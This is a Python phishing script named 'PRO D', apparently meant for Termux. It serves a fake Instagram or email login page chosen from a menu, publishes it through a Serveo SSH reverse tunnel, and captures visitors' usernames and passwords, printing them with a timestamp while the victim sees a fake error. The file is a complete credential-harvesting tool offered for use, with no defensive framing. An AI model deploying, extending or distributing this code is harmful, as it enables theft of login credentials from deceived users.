import os
import sys
import logging
import socket
import subprocess
import threading
import itertools
import time
from datetime import datetime

# -------- Auto-install Flask --------
def install(package):
    os.system(f"{sys.executable} -m pip install {package}")

try:
    from flask import Flask, request, send_from_directory
except ModuleNotFoundError:
    print("Installing Flask...")
    install("flask")
    from flask import Flask, request, send_from_directory

# Install openssh if missing
if os.system("command -v ssh > /dev/null") != 0:
    os.system("pkg install -y openssh")

# -------- Colors --------
red   = '\033[1;31m'
grn   = '\033[1;32m'
ylo   = '\033[1;33m'
cyan  = '\033[1;36m'
pink  = '\033[1;35m'
reset = '\033[0m'

# -------- Suppress Flask logs --------
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# -------- Banner --------
def banner():
    os.system("clear")
    print(f"""{red}
 ____  ____   ___    ____  
|  _ \\|  _ \\ / _ \\  |  _ \\ 
| |_) | |_) | | | | | | | |
|  __/|  _ <| |_| | | |_| |
|_|   |_| \\_\\\\___/  |____/ 

{cyan}        PRO D
{pink}   Created by Dhani v1.0{reset}
""")

# -------- Flask App --------
from flask import Flask, request, send_from_directory
app = Flask(__name__)
selected_html = "1.html"  # default HTML file

@app.route('/')
def home():
    return send_from_directory(".", selected_html)

@app.route('/login', methods=["POST"])
def login():
    global stop_spinner
    stop_spinner = True  # stop waiting animation

    username = request.form.get("username")
    password = request.form.get("password")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(f"""{pink}
╔══════════════════════╗
║ {cyan}Username:{ylo} {username}{reset}
║ {cyan}Password:{ylo} {password}{reset}
║ {cyan}Time    :{ylo} {timestamp}{reset}
╚══════════════════════╝
""")
    return "Something went wrong again later :("

# -------- Find free port --------
def get_free_port(start_port=8080):
    port = start_port
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
            port += 1

# -------- Spinner Animation --------
stop_spinner = False
def spinner():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if stop_spinner:
            break
        sys.stdout.write(f"\r{pink}[{cyan}*{pink}] Waiting for logins... {c}{reset}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write(f"\r{grn}[✓] Login captured!         {reset}\n")

# -------- Run Flask + Serveo --------
def run_server():
    port = get_free_port(8080)

    print(f"{pink}╔══════════════════════╗")
    print(f"║ {cyan}Starting server...{reset}")
    print(f"{pink}╚══════════════════════╝{reset}\n")

    # Start Serveo tunnel in background
    ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
    process = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    # Print tunnel URL nicely
    for line in process.stdout:
        if "Forwarding HTTP" in line:
            public_url = line.strip().split()[-1]
            print(f"""{grn}
╔══════════════════════╗
║ {cyan}Public Link:{ylo} {public_url}{reset}
╚══════════════════════╝
""")

            # Start spinner animation
            threading.Thread(target=spinner, daemon=True).start()
            break

    # Run Flask (blocking)
    app.run(host="127.0.0.1", port=port, debug=False)

if __name__ == "__main__":
    banner()

    # ----- menu -----
    print(f"""{pink}
╔══════════════════════╗
║ {cyan}Choose Page Template{pink}
╠══════════════════════╣
║ [1] instagram
║ [2] email
╚══════════════════════╝
{reset}""")
    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
    selected_html = "11.html" if choice == "1" else "2.html"

    run_server()
